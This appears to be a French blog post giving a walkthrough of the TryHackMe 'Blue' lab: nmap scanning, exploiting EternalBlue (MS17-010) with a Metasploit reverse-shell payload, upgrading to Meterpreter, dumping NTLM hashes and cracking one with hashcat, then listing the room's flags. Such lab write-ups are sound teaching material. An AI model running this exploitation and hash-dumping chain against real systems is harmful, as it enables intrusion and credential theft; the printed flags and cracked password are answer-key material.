---
layout: post
title: "TryHackMe - Blue"
date: 2026-01-05 14:00:00 +0100
author: Howl
categories: [ctf]
tags: [windows, eternalblue, ms17-010, metasploit, easy]
platform: tryhackme
difficulty: easy
excerpt: "Exploitation de la célèbre vulnérabilité EternalBlue (MS17-010) sur une machine Windows 7. Un classique incontournable pour comprendre les exploits SMB."
---

## Informations

| Champ       | Valeur              |
|-------------|---------------------|
| Plateforme  | TryHackMe           |
| OS          | Windows 7           |
| Difficulté  | Easy                |
| Room        | Blue                |

---

## Reconnaissance

```bash
nmap -sC -sV -p- --min-rate 5000 <IP>
```

```
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds  Windows 7 SP1
3389/tcp open  ms-wbt-server
```

On vérifie la vulnérabilité EternalBlue :

```bash
nmap --script smb-vuln-ms17-010 -p 445 <IP>
```

```
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
```

La machine est vulnérable !

---

## Exploitation

### MS17-010 — EternalBlue

```bash
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <IP>
set LHOST <VOTRE_IP>
set PAYLOAD windows/x64/shell/reverse_tcp
run
```

On obtient un shell SYSTEM.

---

## Post-Exploitation

### Élévation vers Meterpreter

Pour faciliter le post-ex, on migre vers un process plus stable :

```bash
# Dans le shell obtenu
background
use post/multi/manage/shell_to_meterpreter
set SESSION 1
run
```

### Dump des hashs NTLM

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

On peut cracker le hash de Jon avec John ou Hashcat :

```bash
hashcat -m 1000 ffb43f0de35be4d9917ac0cc8ad57f8d /usr/share/wordlists/rockyou.txt
# Résultat: alqfna22
```

---

## Flags

```
Flag 1 : flag{access_the_machine}    — C:\
Flag 2 : flag{sam_database_elevated_access} — C:\Windows\System32\config
Flag 3 : flag{admin_documents_can_be_valuable} — C:\Users\Jon\Documents
```

---

## Conclusion

Blue illustre parfaitement l'impact de MS17-010, la vulnérabilité utilisée par WannaCry en 2017. La leçon : mettre à jour ses systèmes Windows est **critique**.

**Outils :** `nmap`, `metasploit`, `hashcat`
